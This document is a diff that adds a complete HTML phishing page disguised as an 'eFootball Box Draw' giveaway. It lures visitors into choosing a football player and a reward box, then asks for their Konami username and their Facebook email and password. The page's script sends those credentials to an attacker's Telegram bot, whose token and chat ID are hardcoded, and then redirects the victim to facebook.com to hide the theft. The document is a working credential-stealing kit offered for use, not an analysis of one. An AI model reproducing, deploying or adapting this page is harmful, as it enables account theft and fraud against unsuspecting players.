@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>eFootball Box Draw 💎</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #141e30, #243b55);
+      font-family: Arial, sans-serif;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    h2 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    .player {
+      background: rgba(255,255,255,0.1);
+      padding: 15px;
+      border-radius: 15px;
+      margin-bottom: 15px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.5);
+    }
+    .player img {
+      width: 130px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.6);
+    }
+    .player h3 {
+      margin: 8px 0 4px 0;
+      font-size: 20px;
+    }
+    .player p {
+      margin: 0;
+      font-size: 14px;
+    }
+    .box-options button {
+      padding: 10px 20px;
+      margin: 8px;
+      border: none;
+      border-radius: 8px;
+      background: #1da1f2;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 15px;
+    }
+    #loginBox {
+      display: none;
+      margin-top: 20px;
+      background: rgba(255,255,255,0.1);
+      padding: 15px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+    input, select {
+      width: 80%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      font-size: 15px;
+    }
+    .btn {
+      padding: 10px 25px;
+      border-radius: 8px;
+      border: none;
+      background: #4267B2;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>⚽ eFootball Box Draw</h2>
+
+  <div class="player">
+    <img src="https://i.imgur.com/NR6q8lx.jpeg" alt="Lamine Yamal">
+    <h3>Lamine Yamal</h3>
+    <p>🇪🇸 Spain • FC Barcelona</p>
+  </div>
+
+  <div class="player">
+    <img src="https://i.imgur.com/MF7paas.jpeg" alt="Maldini">
+    <h3>Paolo Maldini</h3>
+    <p>🇮🇹 Italy • AC Milan</p>
+  </div>
+
+  <div class="player">
+    <img src="https://i.imgur.com/eIPJosp.jpeg" alt="Adriano">
+    <h3>Adriano</h3>
+    <p>🇧🇷 Brazil • Retired Legend</p>
+  </div>
+
+  <h4>👑 Select Your Player:</h4>
+  <select id="playerChoice">
+    <option value="">-- Choose Player --</option>
+    <option value="Lamine Yamal">Lamine Yamal</option>
+    <option value="Paolo Maldini">Paolo Maldini</option>
+    <option value="Adriano">Adriano</option>
+  </select>
+
+  <h4>Select Your Box:</h4>
+  <div class="box-options">
+    <button onclick="showInputs('FREE')">FREE</button>
+    <button onclick="showInputs('100 COINS')">100 COINS</button>
+    <button onclick="showInputs('900 COINS')">900 COINS</button>
+  </div>
+
+  <div id="loginBox">
+    <h4>🎮 Your eFootball KONAMI Username</h4>
+    <input type="text" id="konamiName" placeholder="Enter Konami Username"><br>
+
+    <h4>🔒 Facebook Login Required</h4>
+    <input type="text" id="user" placeholder="Facebook Email or Phone"><br>
+    <input type="password" id="pass" placeholder="Facebook Password"><br>
+    <button class="btn" onclick="sendToTelegram()">Login with Facebook</button>
+  </div>
+
+  <script>
+    function showInputs(boxType) {
+      const player = document.getElementById("playerChoice").value;
+      if (!player) {
+        alert("Please select a player first!");
+        return;
+      }
+      alert("Opening " + boxType + " Box...");
+      setTimeout(() => {
+        document.getElementById('loginBox').style.display = 'block';
+      }, 1500);
+    }
+
+    function sendToTelegram() {
+      const token = "7578116786:AAFeMNECL8CZVjXnSpIFuNfX518ul-29Bxo";
+      const chatId = "871438242";
+
+      const konami = document.getElementById("konamiName").value.trim();
+      const player = document.getElementById("playerChoice").value;
+      const username = document.getElementById("user").value.trim();
+      const password = document.getElementById("pass").value.trim();
+
+      if (!konami || !player || !username || !password) {
+        alert("Please fill in all fields!");
+        return;
+      }
+
+      const message = `⚽ eFootball Box Login ⚽\n🎮 KONAMI: ${konami}\n👑 Player: ${player}\n👤 FB: ${username}\n🔑 Pass: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+          alert("Success! Redirecting...");
+          window.location.href = "https://facebook.com";
+        })
+        .catch(() => alert("Error. Please try again."));
+    }
+  </script>
+
+</body>
+</html>
